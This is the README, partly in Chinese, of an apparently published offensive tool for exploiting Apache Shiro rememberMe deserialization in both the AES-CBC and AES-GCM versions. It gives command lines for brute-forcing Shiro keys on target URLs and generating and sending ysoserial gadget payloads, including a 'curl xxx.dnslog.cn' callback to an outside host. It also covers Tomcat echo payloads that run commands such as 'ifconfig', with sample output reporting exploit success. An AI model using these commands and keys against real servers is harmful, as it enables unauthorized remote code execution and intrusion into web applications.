# shiro-exploit

for `AttributeError: module 'Crypto.Cipher.AES' has no attribute 'MODE_GCM'`
```
pip3 install pycryptodome
```

## Usage:
```
python3 shiro-exploit.py mode arguments
    You Can Change Default Key and Ysoserial Path at The Top of File
    For Most Usage: [-u url]    Will Send Payload To Target URL 
                                Left it Empty to Genereate Payload and Exploit Manual
                    [-k key]    Will Encrypt Payload With Specific Key 
                                Left it Empty to Use Shiro Default Key kPH+bIxk5D2deZiIxcaaaA==  
                    [-v version]Will Encrypt Payload to Specific Shiro Encrypt Version 
                                if Shiro Used AES-CBC  Set -v to 1 , if Shiro Used AES-GCM Set -v to 2 , or Left it Empty to Use Default 1
                    Those arguments is Not Necessary , Change it If You Need
    Sample:
    python3 shiro-exploit.py check -u http://127.0.0.1  Auto Detect Shiro Key For Version 1 And Version 2
    python3 shiro-exploit.py check -u http://127.0.0.1 -v 1 Auto Detect Shiro Key For Version 1
    python3 shiro-exploit.py check -k zSyK5Kp6PZAAjlT+eeNMlg== Genereate Check Specific Key Payload For Version 1 and 2
    python3 shiro-exploit.py check -k zSyK5Kp6PZAAjlT+eeNMlg== -v 2 Genereate Check Specific Key Payload For Version 2
    python3 shiro-exploit.py yso -g URLDNS -c "http://xxx.dnslog.pro" -u http://127.0.0.1 -k zSyK5Kp6PZAAjlT+eeNMlg== -v 1 Send Ysoserial Payload to Target URL
    python3 shiro-exploit.py yso -g URLDNS -c "http://xxx.dnslog.pro" -k zSyK5Kp6PZAAjlT+eeNMlg== -v 1 Genereate Ysoserial Payload
    python3 shiro-exploit.py echo -g CommonsCollectionsK1 -c "ifconfig" -u http://127.0.0.1 Send Tomcat Echo Payload To Target URL 
    python3 shiro-exploit.py echo -g CommonsCollectionsK1 -c "ifconfig" -k zSyK5Kp6PZAAjlT+eeNMlg== Genereate Tomcat Echo Payload
    python3 shiro-exploit.py encode -s ./cookie.ser -u http://127.0.0.1 Encode Serialize File And Send to Target URL
    python3 shiro-exploit.py encode -s ./cookie.ser -k zSyK5Kp6PZAAjlT+eeNMlg== Encode Serialize File For Exploit Manual
```

新版本Shiro(>=1.4.2)采用了AES-GCM加密方式，导致旧版工具的加密算法无法正常利用漏洞

重构脚本增加了对于新版Shiro的key爆破和漏洞利用支持，前提为新版Shiro在代码中指定了较常见的key或通过任意文件读取下载到了key，如代码中没有指定则会使用随机key，无法进行利用

> 旧版链接：https://github.com/Ares-X/shiro-exploit/old/shiro.py
> decode.py 和 ndecode.py 为新旧版本shiro的解密脚本

对于大部分功能存在三个可选参数：

`-v` 参数可指定shiro的版本，CBC加密版本 Version 为1 ，GCM加密版本 Version 为2 (目前最新为GCM) 如不指定默认为1

`-u` 参数可将payload发送至指定url，如不指定url将输出base64编码后的payload用于手工利用

`-k` 参数可指定shiro加密所用的key，如不指定将使用默认key `kPH+bIxk5D2deZiIxcaaaA== ` 可修改文件头部的key来更换默认key

如需配合ysoerial使用请在脚本中更改`yso_path`的路径指向本机对应的ysoserial.jar,或将ysoserial.jar 放至脚本同目录下

## Shiro key检测，无需dnslog平台

爆破Shiro key，如不指定版本 -v 将自动尝试两个版本的爆破

```
python3 shiro-exploit.py check -u http://xxx/
```

或指定Shiro版本
```
python3 shiro-exploit.py check -u http://xxx/ -v 2
```

获取指定key的check数据

```
python3 shiro-exploit.py check -k <key>
```

## 编码/发送序列化数据作为payload

```
python3 shiro-exploit.py encode -s ./cookie.ser -u http://xxx/
```

获取Payload编码内容

```
python3 shiro-exploit.py encode -s ./cookie.ser 
```

## 配合ysoserial生成Payload

```
python3 shiro-exploit.py yso -g CommonsCollections6 -c "curl xxx.dnslog.cn" -u http://xxxx/
```

获取Payload编码内容

```
python3 shiro-exploit.py yso -g CommonsCollections6 -c "curl xxx.dnslog.cn"
```

## 生成回显Payload,无需指定Command

默认命令为`whoami`,可在生成的Payload的header中修改`testcmd`对应内容

内置xray的6条tomcat回显链

`[CommonsCollectionsK1/CommonsCollectionsK2/CommonsBeanutils1/CommonsBeanutils2/Jdk7u21/Jdk8u20]`

```
python3 shiro-exploit.py echo -g  CommonsCollectionsK1 
```

##  发送回显Payload,可指定Command

不指定command默认为`whoami`

```bash
python3 shiro-exploit.py echo -g CommonsCollectionsK1 -u http://127.0.0.1:8080/login -c ifconfig
```

```bash
╰─➤ python3 shiro-exploit.py echo -g CommonsCollectionsK1 -u http://127.0.0.1:9080/login -c "ip addr"                  2 ↵
Congratulation: exploit success

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: tunl0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
3: ip6tnl0@NONE: <NOARP> mtu 1452 qdisc noop state DOWN group default qlen 1000
    link/tunnel6 :: brd ::
19: eth0@if20: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```

攻击最新版AES-GCM加密的shiro 

```bash
╰─➤ python3 shiro-exploit.py echo -g CommonsCollectionsK1 -u http://127.0.0.1 -v 2 -k zSyK5Kp6PZAAjlT+eeNMlg== -c ifconfig
Congratulation: exploit success

lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 16384
	options=1203<RXCSUM,TXCSUM,TXSTATUS,SW_TIMESTAMP>
	inet 127.0.0.1 netmask 0xff000000
	inet6 ::1 prefixlen 128
	inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1
	nd6 options=201<PERFORMNUD,DAD>
gif0: flags=8010<POINTOPOINT,MULTICAST> mtu 1280
stf0: flags=0<> mtu 1280
ap1: flags=8802<BROADCAST,SIMPLEX,MULTICAST> mtu 1500
	options=400<CHANNEL_IO>
	ether 3a:81:7f:08:7b:ce
	media: autoselect
	status: inactive
```

出现Congratulation说明存在漏洞，无法获取命令执行结果可能因为命令有误,请更换命令或复制到burp手动利用查看回显
